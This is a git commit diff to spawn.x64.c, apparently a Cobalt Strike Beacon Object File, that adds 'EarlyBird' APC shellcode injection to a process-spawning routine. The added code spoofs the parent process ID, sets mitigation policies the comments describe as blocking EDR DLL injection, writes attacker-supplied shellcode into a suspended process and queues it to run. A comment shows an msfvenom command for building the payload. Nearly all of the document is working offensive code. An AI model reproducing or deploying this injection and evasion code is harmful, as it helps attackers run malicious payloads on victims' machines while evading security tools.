2e719783af51fd4251914740507dd487119d3b9a
boku <19784872+boku7@users.noreply.github.com>
2021-08-01 08:55:51 -0700

    Update spawn.x64.c

--- spawn.x64.c
+++ spawn.x64.c
@@ -9,6 +9,8 @@
 // - https://institute.sektor7.net/ (Courses)
 // - https://github.com/ajpc500/BOFs 
 
+#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)
+
 // Bug Fix (07/20/21) - Compiling issues with on Kali
 // macos compiled fine, but on kali some definitions were not included. Manually defined them here. 
 // Successful compilation on:
@@ -16,6 +18,11 @@
 // - x86_64-w64-mingw32-gcc (GCC) 10-win32 20210110
 // Defined in WinBase.h on windows system - has "2" at end to avoid duplicate declaration warnings/errors on macOS
 #define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2   0x0000100000000000
+
+// grep -ir "PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON" /usr/local/Cellar/mingw-w64/9.0.0/toolchain-x86_64/x86_64-w64-mingw32/include/        
+// /usr/local/Cellar/mingw-w64/9.0.0/toolchain-x86_64/x86_64-w64-mingw32/include/winbase.h:#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON (0x0001ULL << 36)
+#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2 0x0000001000000000
+
 #define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2 0x00020007
 #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2    0x00020000
 /*                              RCX           RDX               R8                            R9      [RSP+0x0]     [RSP+0x8] [RSP+0x10]
@@ -41,11 +48,26 @@ DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$UpdateProcThreadAttribute (LP
 DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$DeleteProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
 WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
+DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
+DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);
 
-void SpawnProcess(char * peName, DWORD ppid){
+void SpawnProcess(char * peName, DWORD ppid, unsigned char * shellcode, SIZE_T shellcode_len){
     // Declare variables/struct
+    // Declare booleans as WINBOOL in BOFs. "bool" will not work
+    WINBOOL check1 = 0;
+    WINBOOL check2 = 0;
+    WINBOOL check3 = 0;
+    WINBOOL check4 = 0;
+    WINBOOL check5 = 0;
+    // Pointer to the RE memory in the remote process we spawn. Returned from when we call WriteProcessMemory with a handle to the remote process
+	void * remotePayloadAddr;
+    //ULONG_PTR dwData = NULL;
+    SIZE_T bytesWritten;
     // (07/20/21) - Changed from STARTUPINFOEX -> STARTUPINFOEXA
     STARTUPINFOEXA2 sInfoEx = { sizeof(sInfoEx) };
+    intZeroMemory( &sInfoEx, sizeof(sInfoEx) );
     //   STARTUPINFOEXA - https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
     //   STARTUPINFOA   - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     //   typedef struct _STARTUPINFOEXA {
@@ -53,6 +75,7 @@ void SpawnProcess(char * peName, DWORD ppid){
     //     LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
     //   } STARTUPINFOEXA, *LPSTARTUPINFOEXA
     PROCESS_INFORMATION pInfo;
+    intZeroMemory(&pInfo, sizeof(pInfo));
     SIZE_T cbAttributeListSize = 0;
 
     PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
@@ -62,15 +85,16 @@ void SpawnProcess(char * peName, DWORD ppid){
     // "Nope, Falcon loads perfectly fine with 'blockdlls' enabled and hooks ntdll. umppcXXXX.dll (Falcon's injected DLL) is digitally signed by MS so no wonder this doesn't prevents EDR injection pic.twitter.com/lDT4gOuYSV"
     //   — reenz0h (@Sektor7Net) October 25, 2019
     // https://blog.xpnsec.com/protecting-your-malware/
-    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;
+    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2 + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2;
+    //DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;
 
     // Get a handle to the target process
     HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
     if (hProc != NULL) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Opened handle 0x%x to process %d(PID)", hProc, ppid);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened handle 0x%x to process %d(PID)", hProc, ppid);
     }
     else{
-        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get handle to process: %d(PID)", ppid);
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get handle to process: %d(PID)", ppid);
         return;
     }
     // Create an Attribute list. Make sure to have the second argument as 2 since we need to have 2 attributes in our lost
@@ -91,10 +115,68 @@ void SpawnProcess(char * peName, DWORD ppid){
     sInfoEx.lpAttributeList = pAttributeList;
 	
     // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
-    WINBOOL check = KERNEL32$CreateProcessA(NULL, peName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&sInfoEx, &pInfo);
+    WINBOOL check = KERNEL32$CreateProcessA(NULL, peName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&sInfoEx, &pInfo);
     if (check){
-        BeaconPrintf(CALLBACK_OUTPUT, "Success! Spawned process: %s | PID: %d | PPID: %d", peName,pInfo.dwProcessId,ppid);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned process: %s | PID: %d | PPID: %d", peName,pInfo.dwProcessId,ppid);
     }
+    else{
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not create a process for %s using CreateProcessA()",peName);
+        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
+        return;
+    }
+// Allocate memory in the spawned process
+    // We can write to PAGE_EXECUTE_READ memory in the remote process with WriteProcessMemory, so no need to allocate RW/RWE memory
+    remotePayloadAddr = KERNEL32$VirtualAllocEx(pInfo.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    if (remotePayloadAddr != NULL){
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated RE memory in remote process %d (PID) at: 0x%p", pInfo.dwProcessId, remotePayloadAddr);
+    }
+    else{
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not allocate memory to remote process %d (PID)", pInfo.dwProcessId);
+        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
+        return;
+    }
+    // Write our popCalc shellcode payload to the remote process we spawned at the memory we allocated 
+    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+    check3 = KERNEL32$WriteProcessMemory(pInfo.hProcess, remotePayloadAddr, (LPCVOID)shellcode, (SIZE_T)shellcode_len, (SIZE_T *) &bytesWritten);
+    if (check3 == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote %d bytes to memory in remote process %d (PID) at 0x%p", bytesWritten, pInfo.dwProcessId, remotePayloadAddr);
+    }
+    else{
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not write payload to memory at 0x%p", remotePayloadAddr);
+        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
+        return;
+    }
+
+    // This is the "EarlyBird" technique to hijack control of the processes main thread using APC
+    // technique taught in Sektor7 course: RED TEAM Operator: Malware Development Intermediate Course
+    // https://institute.sektor7.net/courses/rto-maldev-intermediate/463257-code-injection/1435343-earlybird
+    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
+    // DWORD QueueUserAPC(
+    //   PAPCFUNC  pfnAPC,   - A pointer to the payload we want to run
+    //   HANDLE    hThread,  - A handle to the thread. Returned at PROCESS_INFORMATION.hThread after CreateProcessA call
+    //   ULONG_PTR dwData    - Argument supplied to pfnAPC? Can be NULL
+    // );
+    check4 = KERNEL32$QueueUserAPC((PAPCFUNC)remotePayloadAddr, pInfo.hThread, (ULONG_PTR) NULL);
+    if (check4 == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] APC queued for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
+    }
+    else{
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not queue APC for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
+        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
+        return;
+    }
+    // When we resume the main thread from suspended, APC will trigger and our thread will execute our shellcode
+    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
+    check5 = KERNEL32$ResumeThread(pInfo.hThread);
+    if (check5 != -1){
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Thread resumed and shellcode is being executed within the remote process!");
+    }
+    else{
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not resume thread.");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
+        return;
+    }
+
     // Cleanup the attribute list and close the handle to the parent process we spoofed
     KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
     KERNEL32$CloseHandle(hProc);	
@@ -103,8 +185,16 @@ void go(char * args, int len) {
     datap parser;
     char * peName;
     DWORD ppid;
+
+     // Example of creating a raw shellcode payload with msfvenom
+    //   msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o popCalc.bin
+	unsigned char * shellcode;
+    SIZE_T shellcode_len; 
+
     BeaconDataParse(&parser, args, len);
     peName = BeaconDataExtract(&parser, NULL);
     ppid = BeaconDataInt(&parser);
-    SpawnProcess(peName,ppid);
+    shellcode_len = BeaconDataLength(&parser);
+    shellcode = BeaconDataExtract(&parser, NULL);
+    SpawnProcess(peName,ppid,shellcode,shellcode_len);
 }
